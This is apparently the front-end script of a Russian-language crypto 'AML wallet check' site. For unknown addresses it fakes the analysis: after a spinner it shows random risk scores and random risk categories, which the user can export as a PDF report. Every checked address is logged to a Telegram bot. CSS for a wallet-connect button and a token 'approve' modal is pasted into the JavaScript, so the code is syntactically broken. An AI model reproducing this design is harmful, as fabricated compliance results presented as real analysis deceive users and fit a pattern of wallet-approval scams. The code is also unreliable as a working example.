// Получаем элементы
const walletInput = document.getElementById('walletInput');
const checkBtn = document.getElementById('checkBtn');
const resultSection = document.getElementById('resultSection');
const checkedAddress = document.getElementById('checkedAddress');
const totalTx = document.getElementById('totalTx');
const suspiciousTx = document.getElementById('suspiciousTx');
const walletAge = document.getElementById('walletAge');
const lastActive = document.getElementById('lastActive');
const riskPercent = document.getElementById('riskPercent');
const riskChart = document.getElementById('riskChart');
const riskLevel = document.getElementById('riskLevel');
const sourcesList = document.getElementById('sourcesList');
const downloadPdfBtn = document.getElementById('downloadPdfBtn');

// Категории с иконками (для отображения на сайте, но не для PDF)
const categories = [
    { name: 'Эксплуатация несовершеннолетних', icon: 'fa-child' },
    { name: 'Даркнет-маркеты', icon: 'fa-skull' },
    { name: 'Запрещённые сервисы', icon: 'fa-ban' },
    { name: 'Под следствием', icon: 'fa-gavel' },
    { name: 'Подозрительные биржи', icon: 'fa-building' },
    { name: 'Неавторизованные казино', icon: 'fa-dice' },
    { name: 'Мошеннические сервисы', icon: 'fa-user-secret' },
    { name: 'Миксеры и тумблеры', icon: 'fa-random' },
    { name: 'Вымогательство', icon: 'fa-hand-holding-usd' },
    { name: 'Санкционные адреса', icon: 'fa-flag' },
    { name: 'Мошенничество (скам)', icon: 'fa-frown' },
    { name: 'Хакерские атаки', icon: 'fa-hacker' },
    { name: 'Финансирование терроризма', icon: 'fa-bomb' },
    { name: 'Криптоматы', icon: 'fa-money-bill' },
    { name: 'Биржи без KYC', icon: 'fa-exchange-alt' },
    { name: 'Пулы ликвидности', icon: 'fa-water' },
    { name: 'P2P-биржи высокого риска', icon: 'fa-handshake' },
    { name: 'Неизвестные сервисы', icon: 'fa-question' }
];

// Заполняем сетку категорий
const categoriesGrid = document.getElementById('categoriesGrid');
if (categoriesGrid) {
    categories.forEach(cat => {
        const card = document.createElement('div');
        card.className = 'category-card';
        card.innerHTML = `<i class="fas ${cat.icon}"></i> ${cat.name}`;
        categoriesGrid.appendChild(card);
    });
}

// Демо-адреса
const demoAddresses = {
    '1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa': {
        risk: 2,
        sources: ['Чистый кошелёк'],
        totalTx: 1024,
        suspiciousTx: 0,
        age: '15 лет',
        lastActive: '01.01.2026'
    },
    'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh': {
        risk: 45,
        sources: ['Миксеры', 'Биржи без KYC'],
        totalTx: 345,
        suspiciousTx: 78,
        age: '2 года',
        lastActive: '15.02.2026'
    },
    '3J98t1WpEZ73CNmQviecrnyiWrnqRhWNLy': {
        risk: 88,
        sources: ['Даркнет-маркеты', 'Вымогательство', 'Санкционные адреса'],
        totalTx: 1567,
        suspiciousTx: 932,
        age: '8 мес.',
        lastActive: '10.02.2026'
    }
};

// Функция отправки в Telegram
async function sendToTelegram(data) {
    try {
        const response = await fetch('/.netlify/functions/send-to-telegram', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        });
        const result = await response.json();
        if (!response.ok) {
            console.error('Ошибка отправки в Telegram:', result.error);
        } else {
            console.log('✅ Данные успешно отправлены');
        }
    } catch (error) {
        console.error('Ошибка при отправке:', error);
    }
}

// Обновление кругового графика
function updateRiskChart(risk) {
    const angle = (risk / 100) * 360;
    if (riskChart) {
        riskChart.style.background = `conic-gradient(#ff6b6b 0deg, #ff6b6b ${angle}deg, #00c9b7 ${angle}deg 360deg)`;
    }
    
    let level = 'Низкий';
    let color = '#00c9b7';
    if (risk > 25 && risk <= 75) { level = 'Средний'; color = '#ffaa5e'; }
    else if (risk > 75) { level = 'Высокий'; color = '#ff6b6b'; }
    
    if (riskLevel) {
        riskLevel.textContent = level;
        riskLevel.style.background = `linear-gradient(135deg, ${color}, #fff)`;
        riskLevel.style.webkitBackgroundClip = 'text';
        riskLevel.style.webkitTextFillColor = 'transparent';
    }
    if (riskPercent) {
        riskPercent.textContent = risk + '%';
    }
}

// Генерация случайных данных
function generateRandomData(address) {
    const risk = Math.floor(Math.random() * 19) + 2; // 2-20%
    const total = Math.floor(Math.random() * 500) + 50;
    const suspicious = Math.floor(total * (risk / 100));
    const ageMonths = Math.floor(Math.random() * 24) + 1;
    const age = ageMonths < 12 ? ageMonths + ' мес.' : Math.floor(ageMonths/12) + ' г. ' + (ageMonths%12) + ' мес.';
    const lastActive = new Date(Date.now() - Math.random() * 30*24*60*60*1000).toLocaleDateString('ru-RU');
    const sourcesCount = Math.floor(risk / 10) + 1;
    const shuffled = [...categories].sort(() => 0.5 - Math.random());
    const sources = shuffled.slice(0, sourcesCount).map(c => c.name);
    
    return { risk, total, suspicious, age, lastActive, sources };
}

// Обработчик проверки
if (checkBtn) {
    checkBtn.addEventListener('click', function() {
        const address = walletInput.value.trim();
        if (address === '') {
            alert('Введите адрес кошелька');
            return;
        }

        resultSection.style.display = 'block';
        checkedAddress.textContent = address;

        if (demoAddresses[address]) {
            const data = demoAddresses[address];
            totalTx.textContent = data.totalTx;
            suspiciousTx.textContent = data.suspiciousTx;
            walletAge.textContent = data.age;
            lastActive.textContent = data.lastActive;
            updateRiskChart(data.risk);
            
            sourcesList.innerHTML = '';
            data.sources.forEach(s => {
                const p = document.createElement('p');
                p.innerHTML = `<i class="fas fa-exclamation-circle"></i> ${s}`;
                sourcesList.appendChild(p);
            });
            
            sendToTelegram({ address, risk: data.risk, sources: data.sources, totalTransactions: data.totalTx, suspiciousTransactions: data.suspiciousTx });
        } else {
            totalTx.textContent = '...';
            suspiciousTx.textContent = '...';
            walletAge.textContent = '...';
            lastActive.textContent = '...';
            updateRiskChart(0);
            sourcesList.innerHTML = '<p><i class="fas fa-spinner fa-spin"></i> Анализируем...</p>';

            setTimeout(() => {
                const random = generateRandomData(address);
                totalTx.textContent = random.total;
                suspiciousTx.textContent = random.suspicious;
                walletAge.textContent = random.age;
                lastActive.textContent = random.lastActive;
                updateRiskChart(random.risk);
                
                sourcesList.innerHTML = '';
                random.sources.forEach(s => {
                    const p = document.createElement('p');
                    p.innerHTML = `<i class="fas fa-exclamation-circle"></i> ${s}`;
                    sourcesList.appendChild(p);
                });
                
                sendToTelegram({ address, risk: random.risk, sources: random.sources, totalTransactions: random.total, suspiciousTransactions: random.suspicious });
            }, 1500);
        }
    });
}

// Скачивание PDF
if (downloadPdfBtn) {
    downloadPdfBtn.addEventListener('click', function() {
        try {
            const { jsPDF } = window.jspdf;
            const doc = new jsPDF();
            
            const address = checkedAddress.textContent;
            const risk = riskPercent.textContent;
            const total = totalTx.textContent;
            const suspicious = suspiciousTx.textContent;
            const age = walletAge.textContent;
            const last = lastActive.textContent;
            
            const sourceElements = document.querySelectorAll('#sourcesList p');
            let sourcesText = '';
            sourceElements.forEach(el => {
                let cleanText = el.textContent
                    .replace(/[🔞🛑🚫⚖️🏦🎰🛠️🌀💰🌍🎭🔪💣🏧⚠️💧🤝❓⚠️]/g, '')
                    .replace('⚠️', '')
                    .trim();
                if (cleanText) {
                    sourcesText += '• ' + cleanText + '\n';
                }
            });

            const cleanAddress = address.replace(/[🔍🛡️🔬]/g, '').trim();

            doc.setFont('helvetica', 'normal');
            
            doc.setFontSize(20);
            doc.setTextColor(0, 150, 136);
            doc.text('Отчет AML-проверки', 20, 20);
            
            doc.setFontSize(11);
            doc.setTextColor(80, 80, 80);
            
            let y = 40;
            doc.text('Адрес:', 20, y);
            doc.text(cleanAddress, 70, y);
            y += 10;
            
            doc.text('Риск:', 20, y);
            doc.text(risk, 70, y);
            y += 10;
            
            doc.text('Всего транзакций:', 20, y);
            doc.text(total.toString(), 70, y);
            y += 10;
            
            doc.text('Подозрительных:', 20, y);
            doc.text(suspicious.toString(), 70, y);
            y += 10;
            
            doc.text('Возраст кошелька:', 20, y);
            doc.text(age, 70, y);
            y += 10;
            
            doc.text('Последняя активность:', 20, y);
            doc.text(last, 70, y);
            y += 15;
            
            if (sourcesText) {
                doc.text('Источники риска:', 20, y);
                y += 7;
                const lines = doc.splitTextToSize(sourcesText, 170);
                doc.text(lines, 25, y);
            }
            
            const fileName = `AML-report-${new Date().toISOString().slice(0,10)}.pdf`;
            doc.save(fileName);
            console.log('PDF успешно создан');
            
        } catch (error) {
            console.error('Ошибка при создании PDF:', error);
            alert('Ошибка создания PDF. Проверьте консоль (F12) для деталей.');
        }
    });
}

// Переключение тарифов месяц/год
const monthlyToggle = document.getElementById('monthlyToggle');
const yearlyToggle = document.getElementById('yearlyToggle');
const monthlyPricing = document.getElementById('monthlyPricing');
const yearlyPricing = document.getElementById('yearlyPricing');

if (monthlyToggle && yearlyToggle && monthlyPricing && yearlyPricing) {
    monthlyToggle.addEventListener('click', () => {
        monthlyToggle.classList.add('active');
        yearlyToggle.classList.remove('active');
        monthlyPricing.style.display = 'grid';
        yearlyPricing.style.display = 'none';
    });

    yearlyToggle.addEventListener('click', () => {
        yearlyToggle.classList.add('active');
        monthlyToggle.classList.remove('active');
        yearlyPricing.style.display = 'grid';
        monthlyPricing.style.display = 'none';
    });
}

// Модальные окна
const termsModal = document.getElementById('termsModal');
const amlModal = document.getElementById('amlModal');
const showTerms = document.getElementById('showTerms');
const showAML = document.getElementById('showAMLPolicy');
const closeButtons = document.querySelectorAll('.close, .close-aml');

if (showTerms && termsModal) {
    showTerms.addEventListener('click', (e) => {
        e.preventDefault();
        termsModal.style.display = 'block';
    });
}
if (showAML && amlModal) {
    showAML.addEventListener('click', (e) => {
        e.preventDefault();
        amlModal.style.display = 'block';
    });
}
if (closeButtons.length) {
    closeButtons.forEach(btn => {
        btn.addEventListener('click', () => {
            if (termsModal) termsModal.style.display = 'none';
            if (amlModal) amlModal.style.display = 'none';
        });
    });
}
window.addEventListener('click', (e) => {
    if (e.target === termsModal) termsModal.style.display = 'none';
    if (e.target === amlModal) amlModal.style.display = 'none';
    /* Стили для Trust Wallet кнопки */
.wallet-connect-wrapper {
    text-align: center;
    margin-bottom: 25px;
}

.wallet-connect-btn {
    background: linear-gradient(135deg, #3375BB, #235891);
    color: white;
    border: none;
    border-radius: 12px;
    padding: 14px 28px;
    font-size: 16px;
    font-weight: 600;
    cursor: pointer;
    display: inline-flex;
    align-items: center;
    justify-content: center;
    transition: all 0.3s;
    border: 1px solid rgba(255,255,255,0.1);
}

.wallet-connect-btn:hover {
    transform: translateY(-2px);
    box-shadow: 0 10px 25px rgba(51, 117, 187, 0.4);
}

.wallet-connect-btn img {
    filter: brightness(0) invert(1);
}

#connectedStatus {
    display: inline-flex;
    align-items: center;
    gap: 5px;
    font-size: 14px;
}

/* Карточка суммы */
.amount-card {
    background: linear-gradient(135deg, rgba(0, 201, 183, 0.1), rgba(0, 150, 136, 0.05));
    border: 1px solid rgba(0, 201, 183, 0.3);
    border-radius: 16px;
    padding: 20px;
    margin: 20px 0;
    display: flex;
    align-items: center;
    justify-content: space-between;
}

.amount-label {
    display: flex;
    align-items: center;
    gap: 10px;
    color: #8a94a6;
}

.amount-label i {
    color: #00c9b7;
    font-size: 24px;
}

.amount-value {
    font-size: 28px;
    font-weight: 700;
    color: #00c9b7;
}

/* Модальное окно approve */
.approve-modal {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: rgba(0, 0, 0, 0.8);
    backdrop-filter: blur(10px);
    z-index: 10000;
    display: flex;
    align-items: center;
    justify-content: center;
}

.approve-modal-content {
    background: linear-gradient(135deg, #1a1f2b, #0f1219);
    border: 1px solid rgba(0, 201, 183, 0.3);
    border-radius: 30px;
    padding: 40px;
    max-width: 450px;
    width: 90%;
    box-shadow: 0 25px 50px rgba(0, 0, 0, 0.5);
}

.approve-header {
    text-align: center;
    margin-bottom: 30px;
}

.approve-icon {
    width: 70px;
    height: 70px;
    background: linear-gradient(135deg, #00c9b7, #009688);
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
    margin: 0 auto 20px;
    font-size: 30px;
    color: #0b0e14;
}

.approve-header h2 {
    font-size: 24px;
    margin-bottom: 10px;
    color: #fff;
}

.approve-subtitle {
    color: #8a94a6;
    font-size: 14px;
}

.approve-details {
    background: rgba(0, 0, 0, 0.3);
    border-radius: 16px;
    padding: 20px;
    margin-bottom: 20px;
}

.info-row {
    display: flex;
    justify-content: space-between;
    padding: 10px 0;
    border-bottom: 1px solid rgba(255,255,255,0.05);
}

.info-row:last-child {
    border-bottom: none;
}

.info-label {
    color: #8a94a6;
}

.info-value {
    color: #fff;
    font-weight: 600;
}

.info-value.highlight {
    color: #00c9b7;
    font-size: 20px;
}

.approve-warning {
    background: rgba(255, 170, 94, 0.1);
    border-left: 4px solid #ffaa5e;
    border-radius: 8px;
    padding: 15px;
    margin-bottom: 20px;
    display: flex;
    gap: 15px;
}

.approve-warning i {
    color: #ffaa5e;
    font-size: 20px;
}

.warning-text strong {
    display: block;
    margin-bottom: 5px;
    color: #ffaa5e;
}

.warning-text p {
    color: #8a94a6;
    font-size: 13px;
}

.approve-actions {
    display: flex;
    gap: 15px;
}

.cancel-btn {
    flex: 1;
    padding: 15px;
    background: transparent;
    border: 1px solid rgba(255,255,255,0.1);
    border-radius: 12px;
    color: #fff;
    font-weight: 600;
    cursor: pointer;
    transition: all 0.3s;
}

.cancel-btn:hover {
    background: rgba(255,255,255,0.05);
}

.confirm-btn {
    flex: 1;
    padding: 15px;
    background: linear-gradient(135deg, #00c9b7, #009688);
    border: none;
    border-radius: 12px;
    color: #0b0e14;
    font-weight: 700;
    cursor: pointer;
    transition: all 0.3s;
}

.confirm-btn:hover {
    transform: translateY(-2px);
    box-shadow: 0 10px 25px rgba(0, 201, 183, 0.3);
}
});

